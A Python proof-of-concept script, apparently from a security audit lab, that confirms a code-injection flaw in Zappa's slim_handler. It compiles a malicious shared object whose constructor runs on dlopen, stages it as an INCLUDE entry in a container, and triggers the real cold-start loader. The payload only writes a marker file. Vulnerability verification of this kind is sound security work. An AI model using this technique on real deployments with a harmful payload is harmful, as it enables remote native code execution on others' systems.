#!/usr/bin/env python3
"""VULN-031 — slim_handler cold-start cdll.LoadLibrary of each INCLUDE entry (native code execution).

Vulnerable code : targets/Zappa/zappa/handler.py:116-131, sink :127 cdll.LoadLibrary(os.path.join(os.getcwd(), library))
Vulnerability   : CWE-94 Code Injection (loading an attacker-controlled native library).
Surface         : S3-archive control (slim_handler:true) — amplifies VULN-003.

Mechanism (plain English)
-------------------------
When `SLIM_HANDLER` is set, at cold start Zappa loads every entry in the (config-
derived) `INCLUDE` list as a native shared library from the current directory:

    from ctypes import cdll
    for library in included_libraries:
        cdll.LoadLibrary(os.path.join(os.getcwd(), library))   # handler.py:127

`dlopen` runs an ELF shared object's constructors (`__attribute__((constructor))`)
immediately on load. Because `INCLUDE` files come from the project archive that
VULN-003 shows is attacker-controllable (tar-slip into the extracted dir that is
then on the path), an attacker who controls the archive plants a malicious `.so`
whose constructor executes native code at cold start — no exported function need
even be called.

What a successful run proves
----------------------------
A purpose-built `.so` whose constructor writes a marker file, placed as an
`INCLUDE` entry, is dlopen'd by the real slim-handler init loop and its constructor
RUNS (the marker appears) — native code execution on load.
"""
import json
import os
import secrets
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import LAB_CONTAINER, banner, lab_exec, lab_python, log, verdict

VULN = "VULN-031"
GCC_IMAGE = os.environ.get("GCC_IMAGE", "gcc:14-bookworm")  # used only to compile the demo .so
HERE = os.path.dirname(os.path.abspath(__file__))


def main():
    banner(VULN, "slim_handler cdll.LoadLibrary of INCLUDE entry -> native code exec",
           "zappa/handler.py:116-131 (sink :127 cdll.LoadLibrary)")

    sfx = secrets.token_hex(4)
    cdir = f"/tmp/dbf3_{sfx}"          # cold-start working dir inside the lab container
    marker = f"/tmp/dbf3_marker_{sfx}"  # the .so constructor writes here (proof of native exec)
    build = os.path.join(HERE, "evidence", "build")
    os.makedirs(build, exist_ok=True)

    # 1) A malicious shared object whose constructor runs on dlopen.
    evil_c = f"""#include <stdio.h>
__attribute__((constructor))
static void _ctor(void) {{
    FILE *f = fopen("{marker}", "w");
    if (f) {{ fputs("native-code-executed-via-dlopen-constructor-{sfx}", f); fclose(f); }}
}}
"""
    with open(os.path.join(build, "evil.c"), "w") as f:
        f.write(evil_c)

    log("SETUP", f"compiling a malicious .so (constructor writes {marker}) in a {GCC_IMAGE} container")
    r = subprocess.run(
        ["docker", "run", "--rm", "-v", f"{build}:/out", GCC_IMAGE,
         "sh", "-c", "gcc -shared -fPIC -o /out/evil.so /out/evil.c"],
        capture_output=True, timeout=300,
    )
    if r.returncode != 0 or not os.path.exists(os.path.join(build, "evil.so")):
        log("FAIL", "could not compile evil.so:\n" + r.stderr.decode()[-500:])
        verdict("NEEDS_MANUAL", f"{VULN}: NEEDS_MANUAL — compile a .so with a constructor and place it as an INCLUDE entry")
        return 1

    # 2) Stage the .so as an INCLUDE entry inside the lab container's cold-start dir.
    log("SETUP", f"staging evil.so as an INCLUDE entry in {cdir} inside the lab container")
    lab_exec(["mkdir", "-p", cdir])
    subprocess.run(["docker", "cp", os.path.join(build, "evil.so"), f"{LAB_CONTAINER}:{cdir}/evil.so"], check=True)

    # 3) Drive the REAL slim-handler cold-start (SLIM_HANDLER + INCLUDE=['evil.so']).
    driver = f"""
import json, os, sys
cdir = {cdir!r}
sys.path.insert(0, cdir)
os.chdir(cdir)                                    # LoadLibrary joins os.getcwd() with each INCLUDE entry
# minimal app + settings the handler __init__ needs
open(os.path.join(cdir, "miniapp.py"), "w").write("def app(environ, start_response):\\n return [b'ok']\\n")
open(os.path.join(cdir, "dbf3settings.py"), "w").write(
    "LOG_LEVEL='INFO'\\nPROJECT_NAME='p'\\nAPI_STAGE='dev'\\nENVIRONMENT_VARIABLES={{}}\\n"
    "ARCHIVE_PATH=None\\nSLIM_HANDLER=True\\nINCLUDE=['evil.so']\\n"
    "APP_MODULE='miniapp'\\nAPP_FUNCTION='app'\\nDJANGO_SETTINGS=None\\nAPP_TYPE=None\\n"
    "ADDITIONAL_TEXT_MIMETYPES=None\\nWEBSOCKET_HANDLER_MODULE=None\\nDEBUG=False\\n"
    "BINARY_SUPPORT=False\\nCONTEXT_HEADER_MAPPINGS={{}}\\nEXCEPTION_HANDLER=None\\nREMOTE_ENV=None\\n")
from zappa.handler import LambdaHandler
LambdaHandler(settings_name="dbf3settings")       # <-- REAL cold-start runs the LoadLibrary loop
print(json.dumps({{"marker_exists": os.path.exists({marker!r}),
                   "marker_content": open({marker!r}).read() if os.path.exists({marker!r}) else None}}))
"""
    log("STEP", "cold-starting the slim handler — it should dlopen evil.so and run its constructor")
    cp = lab_python(driver)
    line = cp.stdout.decode().strip().splitlines()[-1] if cp.stdout.strip() else "{}"
    try:
        res = json.loads(line)
    except Exception:
        log("FAIL", "driver output:\n" + cp.stdout.decode()[-400:] + "\n" + cp.stderr.decode()[-400:])
        verdict("FAILED", f"{VULN}: FAILED")
        return 1
    log("INFO", f"marker exists={res.get('marker_exists')} content={res.get('marker_content')!r}")
    lab_exec(["rm", "-rf", cdir, marker])

    if res.get("marker_exists") and res.get("marker_content"):
        log("PROOF", f"the slim-handler init loop dlopen'd the attacker INCLUDE entry evil.so, and its "
                     f"ELF constructor executed native code that wrote {marker} ({res['marker_content']!r}) — "
                     f"cold-start native RCE from a controlled archive (chains with VULN-003's tar-slip).")
        log("OK", "exploit confirmed — native code executed via cdll.LoadLibrary of an INCLUDE entry")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — slim_handler dlopens attacker .so -> constructor RCE at cold start")
        return 0
    log("FAIL", "marker not written — constructor did not run")
    verdict("FAILED", f"{VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
